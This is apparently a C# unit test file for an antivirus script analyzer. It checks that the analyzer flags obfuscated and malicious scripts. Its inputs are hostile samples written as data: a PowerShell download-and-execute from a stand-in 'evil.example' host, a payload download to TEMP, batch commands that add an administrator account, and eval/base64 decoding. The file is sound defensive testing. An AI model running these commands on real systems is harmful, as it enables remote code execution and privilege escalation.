using FluentAssertions;
using PerSourceAntivirus.Domain.Enums;
using PerSourceAntivirus.Infrastructure.Scripts;

namespace PerSourceAntivirus.Infrastructure.Tests.Scripts;

public class ScriptAnalyzerTests
{
    private readonly ScriptAnalyzer _analyzer = new();

    private static string TempScript(string extension) =>
        Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}{extension}");

    [Fact]
    public void Analyze_ReturnsNull_ForNonScriptFile()
    {
        var file = Path.GetTempFileName();
        try
        {
            File.WriteAllText(file, "hello world");
            _analyzer.Analyze(file).Should().BeNull();
        }
        finally
        {
            File.Delete(file);
        }
    }

    [Fact]
    public void Analyze_DetectsPowerShellDownload_AsNetworkAndObfuscation()
    {
        var file = TempScript(".ps1");
        try
        {
            File.WriteAllText(file, "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')");

            var result = _analyzer.Analyze(file);

            result.Should().NotBeNull();
            result!.ScriptType.Should().Be(ScriptType.PowerShell);
            result.HasNetworkAccess.Should().BeTrue();
            result.HasObfuscation.Should().BeTrue();
            result.SuspiciousPatterns.Should().NotBeEmpty();
        }
        finally
        {
            File.Delete(file);
        }
    }

    [Fact]
    public void Analyze_DetectsVBScriptShellExecution()
    {
        var file = TempScript(".vbs");
        try
        {
            File.WriteAllText(file, "Set objShell = CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c whoami\"");

            var result = _analyzer.Analyze(file);

            result.Should().NotBeNull();
            result!.ScriptType.Should().Be(ScriptType.VBScript);
            result.HasProcessExecution.Should().BeTrue();
            result.SuspiciousPatterns.Should().Contain(p => p.Contains("WScript"));
        }
        finally
        {
            File.Delete(file);
        }
    }

    [Fact]
    public void Analyze_DetectsBatchPrivilegeEscalation()
    {
        var file = TempScript(".bat");
        try
        {
            File.WriteAllText(file, "@echo off\r\nnet user hacker P@ssw0rd /add\r\nnet localgroup administrators hacker /add");

            var result = _analyzer.Analyze(file);

            result.Should().NotBeNull();
            result!.ScriptType.Should().Be(ScriptType.Batch);
            result.HasProcessExecution.Should().BeTrue();
            result.SuspiciousPatterns.Should().Contain(p => p.Contains("Privilege"));
        }
        finally
        {
            File.Delete(file);
        }
    }

    [Fact]
    public void Analyze_DetectsJavaScriptEvalAndAtob()
    {
        var file = TempScript(".js");
        try
        {
            File.WriteAllText(file, "var x = eval(atob('c29tZXRoaW5nIG1hbGljaW91cw=='));");

            var result = _analyzer.Analyze(file);

            result.Should().NotBeNull();
            result!.ScriptType.Should().Be(ScriptType.JavaScript);
            result.HasObfuscation.Should().BeTrue();
            result.SuspiciousPatterns.Should().Contain(p => p.Contains("eval"));
        }
        finally
        {
            File.Delete(file);
        }
    }

    [Fact]
    public void Analyze_ReturnsCleanResult_ForBenignScript()
    {
        var file = TempScript(".ps1");
        try
        {
            File.WriteAllText(file, "Write-Host 'Hello, World!'");

            var result = _analyzer.Analyze(file);

            result.Should().NotBeNull();
            result!.ScriptType.Should().Be(ScriptType.PowerShell);
            result.SuspiciousPatterns.Should().BeEmpty();
            result.HasObfuscation.Should().BeFalse();
            result.HasNetworkAccess.Should().BeFalse();
        }
        finally
        {
            File.Delete(file);
        }
    }

    // ---- PowerShell AST-specific tests (patterns a regex would miss) ----

    [Fact]
    public void Analyze_DetectsBase64DecodeChain_ViaAst()
    {
        var file = TempScript(".ps1");
        try
        {
            // [Convert]::FromBase64String is caught by the AST MemberExpressionAst pass
            File.WriteAllText(file,
                "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dABlAHMAdAA='))");

            var result = _analyzer.Analyze(file);

            result.Should().NotBeNull();
            result!.HasObfuscation.Should().BeTrue();
            result.SuspiciousPatterns.Should().Contain(p => p.Contains("Base64"));
        }
        finally { File.Delete(file); }
    }

    [Fact]
    public void Analyze_DetectsEncodedCommandFlag_ViaAst()
    {
        var file = TempScript(".ps1");
        try
        {
            // -EncodedCommand parameter is caught by the CommandParameterAst pass
            File.WriteAllText(file, "powershell.exe -NoProfile -EncodedCommand dABlAHMAdAA=");

            var result = _analyzer.Analyze(file);

            result.Should().NotBeNull();
            result!.HasObfuscation.Should().BeTrue();
            result.SuspiciousPatterns.Should().Contain(p => p.Contains("EncodedCommand"));
        }
        finally { File.Delete(file); }
    }

    [Fact]
    public void Analyze_DetectsInvokeWebRequest_ViaAst()
    {
        var file = TempScript(".ps1");
        try
        {
            File.WriteAllText(file, "Invoke-WebRequest -Uri 'http://evil.example/payload' -OutFile $env:TEMP\\x.exe");

            var result = _analyzer.Analyze(file);

            result.Should().NotBeNull();
            result!.HasNetworkAccess.Should().BeTrue();
            result.SuspiciousPatterns.Should().Contain(p => p.Contains("invoke-webrequest"));
        }
        finally { File.Delete(file); }
    }
}
